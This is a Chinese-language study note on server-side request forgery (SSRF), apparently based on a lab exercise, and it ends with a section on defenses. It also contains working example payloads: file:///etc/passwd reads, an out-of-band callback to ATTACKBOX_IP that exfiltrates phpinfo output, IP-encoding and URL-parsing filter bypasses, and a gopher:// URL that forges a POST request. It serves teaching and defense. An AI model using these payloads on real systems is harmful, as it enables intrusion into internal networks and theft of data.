## 概述 (Overview)

SSRF (Server-Side Request Forgery) 是一种 Web 安全漏洞，允许攻击者诱导服务器端应用程序向攻击者指定的任意目标（可以是远程服务器、服务器自身或其内部网络）发起未经授权的网络请求。这就像攻击者能**强制**服务器代表自己去敲别人（包括服务器自己家或邻居家）的门。

许多 Web 应用需要从其他服务器获取数据（如加载图片、下载文件、获取网页内容、调用 API）。如果应用程序使用了 **用户可控的输入** 来构造目标 URL，并且 **没有对该 URL 进行严格的验证和限制**，就可能产生 SSRF 漏洞。当用户提供的输入被用来构建请求时，例如形成 URL，SSRF 漏洞就可能出现。攻击者可以操纵易受攻击软件中的参数值，有效地创建或控制来自该软件的请求，并将它们指向其他服务器，甚至同一服务器。

SSRF 漏洞可能存在于各种类型的计算机软件中，只要软件在联网环境中运行，尽管它们最常在 Web 应用程序中发现。攻击者可以利用存在 SSRF 缺陷的 Web 应用作为 **代理** 或 **跳板 (stepping stone)** 来攻击通常无法从外部直接访问的内部系统或服务，可能导致数据泄露、服务中断，甚至远程代码执行。

## 漏洞原理 (Vulnerability Principle) / 解剖结构 (Anatomy)

*   **成因**: SSRF 漏洞的核心原因是服务器端代码：
    1.  **接收了来自用户的输入**（通常是 URL 或其一部分）。
    2.  **使用该输入** 来构造并 **发起网络请求** 到另一个资源。
    3.  **缺乏对用户输入目标地址的充分过滤和限制**。
*   **场景**: 想象一个外网用户可以访问的网站 A (e.g., `hrms.thm`)，以及一个只有内部员工能访问的网站 B (e.g., `192.168.2.10/admin.php`)。如果网站 A 提供一个功能，允许用户输入 URL 来获取该 URL 的内容（例如，通过 `?url=` 参数加载版权信息或员工数据），并且没有限制用户输入的 URL，那么攻击者就可以让网站 A 去请求网站 B 的资源。由于请求是由网站 A 的服务器发起的（它在内部网络中），它可以访问内部网络中的网站 B。
*   **关键问题**: 服务器 **信任** 了用户的输入，并代表用户向该输入指定的地址发起了请求，没有充分验证目标的合法性（是否是预期的外部资源？是否指向了内部网络或本地？协议是否安全？）。

## 危害与攻击用途 (Impact and Attack Purposes / Risks)

攻击者利用 SSRF 漏洞可以实现多种恶意目的，主要包括：

1.  **内网/本地端口扫描与服务发现 (Intelligence Gathering)**: 通过向不同的内部 IP 和端口发起请求 (e.g., `http://192.168.1.1:80`, `http://127.0.0.1:6379`)，根据响应时间、状态码或错误信息判断端口是否开放，并可能获取服务 Banner 信息（版本号等）。
2.  **攻击内网/本地应用程序**:
    *   向内部存在的、未授权访问或存在漏洞的服务（如 Redis, Elasticsearch, Docker API, Struts2, WebLogic, 内部数据库管理面板等）发送构造的请求，可能导致命令执行、数据泄露或服务被利用。
    *   利用内部服务可能存在的溢出漏洞。
3.  **内网 Web 应用指纹识别**: 通过请求内部 Web 应用的默认路径、特定文件或目录，识别其使用的框架、CMS 或组件。
4.  **攻击内外网 Web 应用**: 利用 SSRF 发起 GET 请求（在某些情况下通过 `gopher://` 等协议可以发起 POST 等更复杂的请求），攻击目标 Web 应用存在的其他漏洞（如 SQL 注入、命令注入等）。
5.  **读取本地文件 (Data Exfiltration)**: 利用 `file://` 协议读取服务器上的敏感文件（如配置文件 `config.php`, 源代码, `/etc/passwd` 等），类似于本地文件包含 (LFI)。
6.  **拒绝服务 (Denial of Service - DoS)**: 通过向内部服务器发送大量请求，或请求一个会导致资源耗尽的资源（如超大文件、慢速响应的服务），淹没服务器资源，导致其无法处理正常请求或崩溃。内部服务器通常配置较低，更容易受影响。

## 常见触发点 (Common Trigger Points / Vulnerable Locations)

SSRF 漏洞可能出现在任何需要调用外部资源的功能点，特别是当资源的 URL 或其一部分由用户控制时：

*   **通过 URL 分享网页内容**: 如生成网页快照、提取文章标题/摘要。
*   **转码服务**: 如在线视频/音频转码。
*   **在线翻译**: 需要获取待翻译网页的内容。
*   **图片加载/下载/处理**: 通过 URL 上传图片、图片编辑、图片加水印、加载 Banner。
*   **文章/图片收藏**: 需要从源 URL 获取内容。
*   **未公开的 API 或 Web Service 调用**: 后端服务之间通过 URL 进行交互。
*   **从 URL 进行资源订阅或数据同步**。
*   **从 URL 加载页面部分内容**: 如版权信息、员工数据等（见 HRMS 示例）。

**寻找线索**: 留意 URL 参数中包含 URL 或主机名的关键字，例如：
`share`, `wap`, `url`, `link`, `src`, `source`, `target`, `u`, `3g`, `display`, `sourceURL`, `imageURL`, `domain`, `file`, `id` (如果值看起来像 URL 或 IP) 等。

**示例**:
`http://example.com/loadImage?image=http://external-image.com/pic.jpg`
如果将 `image` 参数的值修改为内部 IP 地址或 `file://` 路径，例如：
`http://example.com/loadImage?image=http://192.168.1.100/admin`
`http://example.com/loadImage?image=file:///etc/passwd`
在存在 SSRF 漏洞的情况下，服务器会尝试请求这些内部资源或本地文件。通过观察响应（状态码、内容、错误信息），可以探测内部网络或读取文件。

## SSRF 类型 (Types of SSRF)

SSRF 主要可以分为两大类：

### 1. 基础 SSRF (Basic SSRF)

攻击者可以直接在响应中看到服务器请求的结果。

*   **场景一：针对本地服务器 (Targeting the Local Server)**
    攻击者诱使服务器请求其自身（`localhost`, `127.0.0.1`）上的资源，通常是那些不直接对外暴露的文件或服务。
    *   **示例 (HRMS - 版权页面)**: 应用程序通过 `?url=localhost/copyright` 加载页脚版权信息。由于 `url` 参数未经过滤，攻击者可以修改为 `?url=localhost/config` 来尝试读取本地的 `config.php` 文件。如果成功，文件内容会显示在响应中。

*   **场景二：针对内部服务器 (Targeting Internal Servers)**
    攻击者利用存在 SSRF 的服务器作为跳板，请求同一内部网络中其他服务器上的资源，这些资源通常无法从外部直接访问。
    *   **示例 (HRMS - 员工数据/管理面板)**: 应用程序的某个功能（如下拉菜单）通过内部 IP（如 `http://192.168.2.10/employees.php`）加载数据。攻击者可以通过修改前端代码（如使用浏览器开发者工具）或拦截请求，将目标 URL 改为内部管理面板地址（如 `http://192.168.2.10/admin.php`），从而访问到原本无法直接访问的管理界面。

### 2. 盲 SSRF (Blind SSRF)

攻击者可以向目标服务器发送请求，但 **无法直接** 在响应中看到请求的结果。需要使用间接方法来确认漏洞或提取信息。

*   **带外数据泄露 (Out-of-Band - OOB) / 离线 SSRF (Offline SSRF)**: 攻击者使目标服务器向一个攻击者控制的外部服务器（如 `http://ATTACKER_IP:PORT`）发起请求（如 HTTP 请求或 DNS 查询）。如果攻击者的服务器收到了来自目标服务器的连接或数据，就证明了 SSRF 的存在。
    *   **示例 (HRMS - Profile 页面)**: `profile.php` 页面接收 `url` 参数，并使用 cURL 将服务器信息（如 `phpinfo()` 输出）POST 到该 URL。攻击者设置 `url` 为自己控制的服务器地址 `http://ATTACKBOX_IP:8080`。攻击者在自己的服务器上运行一个简单的 HTTP 服务器（如提供的 Python 脚本）来监听连接并记录接收到的数据。如果服务器接收到来自 HRMS 服务器的数据，就确认了 Blind SSRF，并且可能获取到敏感信息。
        ```python
        # Example Python Listener (Simplified Concept)
        from http.server import SimpleHTTPRequestHandler, HTTPServer
        # ... (Full code from the note) ...
        # Run this on attacker machine: sudo python3 server.py
        # Target URL: http://hrms.thm/profile.php?url=http://ATTACKBOX_IP:8080
        # Check data.html on attacker machine for received info.
        ```

*   **基于时间的半盲 SSRF (Time-Based Semi-Blind SSRF)**: 攻击者通过测量服务器响应时间来推断请求是否成功。如果请求一个已知响应缓慢的内部资源导致响应时间显著增加，或者请求一个不存在的资源导致快速失败，就可以间接判断目标是否存在或可达。

## 常用后端实现及绕过技巧 (Common Backend Implementations and Bypass Techniques)

### 涉及的后端函数 (Relevant Backend Functions - PHP Focus)

SSRF 可能存在于任何后端语言中，在 PHP 代码审计时，需要特别关注以下可能发起网络请求的函数：

*   `curl_exec()`: 使用 cURL 库执行请求，支持多种协议。 **(Highly common for SSRF)**
*   `file_get_contents()`: 可以读取文件内容，也常用于发起 HTTP GET 请求。 **(Very common for SSRF, supports wrappers like `php://filter`)**
*   `fsockopen()`: 打开一个网络连接或 Unix 套接字连接，可以进行更底层的 TCP/UDP 通信。
*   *(其他)*: `fopen()`, `readfile()`, `SoapClient::__call` (可触发 HTTP 请求), `SimpleXMLIterator`/`simplexml_load_file`/`simplexml_load_string` (可加载外部 DTD 或实体，导致 XXE/SSRF)。

### 绕过过滤 (Bypassing Filters)

开发者可能会尝试通过过滤 IP 地址、URL scheme 或域名来阻止 SSRF，但这些过滤常常可以被绕过：

*   **IP 地址表示法绕过 (Bypassing IP Address Filters using Different Notations)**:
    如果后端过滤了常见的私有 IP (e.g., `192.168.*`, `10.*`), 可以尝试：
    *   **八进制**: `http://0177.0.0.1` (等价于 `127.0.0.1`), `http://0300.0250.0.1` (`192.168.0.1`)
    *   **十六进制**: `http://0x7f.0x0.0x0.0x1` (`127.0.0.1`), `http://0xC0.0xA8.0.1` (`192.168.0.1`)
    *   **十进制整数**: `http://2130706433` (`127.0.0.1`), `http://3232235521` (`192.168.0.1`)
    *   **十六进制整数**: `http://0x7F000001` (`127.0.0.1`), `http://0xC0A80001` (`192.168.0.1`)
    *   **混合进制**: `http://0xC0.168.0.1`
    *   **省略 0**: `http://127.1` (可能被解析为 `127.0.0.1`)

*   **URL 解析绕过 (Bypassing via URL Parsing Quirks)**:
    *   **使用 `@`**: `http://example.com@192.168.0.1` 或 `http://attacker.com#\@expected-domain.com/@192.168.1.1`。某些解析器可能错误地将 `@` 前的识别为认证信息，实际请求发往 `@` 后的地址。
    *   **使用短网址服务**: 将恶意 URL 转换为短网址。
    *   **使用句号 `.`**: `http://127.0.0.1./` -> `http://127.0.0.1/`
    *   **使用特殊域名/地址**:
        *   `http://localhost` (通常解析为 `127.0.0.1` 或 `::1`)
        *   `http://[::]` (IPv6 回环地址)
        *   使用 `xip.io` / `nip.io` 等服务: `http://10.0.0.1.xip.io` 会解析为 `10.0.0.1`。
    *   **子域名绕过 (Bypassing Whitelist)**: 如果过滤规则要求 URL 必须以 `https://trusted.com` 开头，攻击者可以注册 `trusted.com.attacker.com` 并让其解析到内部 IP，构造 URL 如 `https://trusted.com.attacker.com/` 来绕过基于前缀的检查。

*   **协议绕过 (Protocol Bypass)**: 如果只过滤了 `http://` 或 `https://`，尝试使用 `file://`, `gopher://`, `dict://`, `ftp://`, `sftp://`, `tftp://`, `ldap://` 等其他协议。

*   **30x 跳转绕过 (HTTP Redirect Bypass)**: 如果服务器会跟随 HTTP 跳转 (如 cURL 设置了 `CURLOPT_FOLLOWLOCATION`)，提供一个看似合法的 URL，该 URL 配置为 301/302 跳转到内部或恶意的 URL。

*   **DNS 解析绕过 / DNS Rebinding (DNS Resolution Bypass / Rebinding)**:
    *   将一个被允许的域名指向一个内部 IP 地址（通过控制 DNS 服务器）。
    *   **DNS Rebinding**: 利用 DNS TTL (Time-To-Live)。攻击者控制一个域名，先让其解析到一个允许访问的外部 IP。服务器验证通过后发起请求。在 TTL 过期后，攻击者修改 DNS 记录，将该域名指向一个内部 IP (如 `127.0.0.1`)。如果服务器再次对该域名发起请求（可能在同一会话或后续操作中），它可能会使用缓存过期的 DNS 记录或重新查询，此时请求就会发往内部 IP。

## 利用其他协议 (Exploiting Other Protocols)

除了 `http/https` 和 `file`，其他协议在 SSRF 中也很有用：

*   **`dict://`**:
    *   **用途**: 用于访问字典服务器协议 (RFC 2229)，常用来探测端口服务和版本信息，或与某些服务（如 Redis）进行简单交互。
    *   **示例**: `http://vulnerable.com/ssrf.php?url=dict://192.168.1.1:6379/info` -> 可能泄露内网 Redis 服务器的信息。 `dict://127.0.0.1:22/` 可探测 SSH 版本。

*   **`gopher://`**:
    *   **用途**: 非常灵活，可以发送 **任意 TCP 流量** (包括非 HTTP 协议)。可以用来构造 POST 请求、攻击 Redis/Memcached/MySQL 等服务、发送 SMTP 邮件等。被称为 SSRF 中的 "万金油"。
    *   **格式**: `gopher://<host>:<port>/<gopher-path>`，其中 `<gopher-path>` 代表原始 TCP 数据流。
    *   **构造注意**:
        *   `<gopher-path>` 的第一个字符通常会被忽略，可以填充一个无用字符 (e.g., `_`)。
        *   回车换行符 (`\r\n`) 在 URL 编码时需要特别处理，通常需要进行 **两次 URL 编码** (CR=`%0d`, LF=`%0a` -> `%250d%250a`)。
    *   **示例 (构造 POST 请求)**:
        假设要发送的原始 POST 数据为：
        ```
        POST /submit.php HTTP/1.1
        Host: 192.168.0.105
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 7

        abc=123
        ```
        构造 Gopher URL (回车换行已二次编码):
        `gopher://192.168.0.105:80/_POST%2520/submit.php%2520HTTP/1.1%250d%250aHost:%2520192.168.0.105%250d%250aContent-Type:%2520application/x-www-form-urlencoded%250d%250aContent-Length:%25207%250d%250a%250d%250aabc=123`
        (实际使用时，通过 SSRF 点访问 `http://vulnerable.com/ssrf.php?url=<上面的gopher URL>`)
    *   **更多 Gopher 攻击面**: 参考 [Gopher Attack Surfaces](https://blog.chaitin.cn/gopher-attack-surfaces/)。

*   **`ftp://`, `sftp://`, `tftp://`, `ldap://`**: 根据目标服务器支持情况和漏洞点实现，也可能被用于探测、数据传输或攻击特定服务。

## 防御措施 (Defense / Mitigation)

防御 SSRF 的核心是严格控制服务器发起的网络请求的目标，并遵循最小权限原则。

1.  **首选：白名单策略 (Whitelist Strategy - Best Practice)**:
    *   只允许应用程序向预先定义好的、可信的域名或 IP 地址列表发起请求。这是最有效的防御方法。维护受信任 URL 或域名的白名单，而不是试图黑名单化不允许的。

2.  **过滤用户输入 (Filter User Input & Sanitize)**:
    *   实施严格的输入验证，确保只接受预期的数据格式。对所有用户提供的输入进行清理，特别是用于发起外部请求的 URL 或参数。
    *   严格校验用户提供的 URL 格式。
    *   解析 URL，获取主机名 (Host)。

3.  **限制协议 (Limit Protocols)**:
    *   仅允许应用程序实际需要的协议，通常是 HTTP 和 HTTPS。显式禁用其他如 `file://`, `gopher://`, `dict://`, `ftp://` 等危险协议。

4.  **过滤目标 IP 地址 (Filter Target IP Address)**:
    *   **解析域名获取 IP**: 对用户提供的 URL 中的域名进行 DNS 解析，获取其对应的 IP 地址。
    *   **校验 IP 归属**: 判断解析得到的 IP 是否为私有地址（如 `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`）、回环地址（`127.0.0.1`, `::1`）、或其他保留地址 (Link-local, Multicast, etc.)。如果是，则禁止请求。
    *   **注意**:
        *   要处理好 DNS 解析可能返回多个 IP 的情况（包括 IPv4 和 IPv6）。对所有返回的 IP 进行检查。
        *   要警惕 DNS Rebinding 攻击。可以通过在验证 IP 后，在实际发起请求前再次检查 IP 是否改变，或者强制使用解析出的 IP 地址进行连接而不是域名。

5.  **统一错误消息**: 避免根据错误消息暴露过多关于内部网络状态或文件系统结构的信息。

6.  **限制请求端口**: 如果可能，限制应用程序允许请求的目标端口（例如，只允许 80 和 443）。

7.  **禁用不必要的重定向跟随**: 例如在 cURL 中不设置 `CURLOPT_FOLLOWLOCATION`，或限制重定向次数和范围。

8.  **内部服务加固 (Harden Internal Services)**:
    *   对内网服务（如 Redis, Memcached, Elasticsearch, MongoDB）进行身份验证、访问控制和网络隔离（Network Segmentation），即使被 SSRF 访问也无法轻易利用。将敏感内部资源与外部访问隔离开。

9.  **响应内容验证 (Validate Response Content)**:
    *   在某些情况下（如加载图片），可以检查返回内容的 `Content-Type` 或内容本身是否符合预期格式，防止返回非预期的敏感数据。

10. **使用安全头部 (Implement Security Headers)**:
    *   内容安全策略 (Content-Security-Policy - CSP) 中的 `connect-src` 指令可以限制 JavaScript 发起连接的目标，虽然主要防御客户端攻击，但也是整体安全策略的一部分。

11. **日志记录与监控 (Logging and Monitoring)**:
    *   实施全面的日志记录，跟踪和分析出站请求。寻找异常或未授权的请求，并为可疑活动设置警报。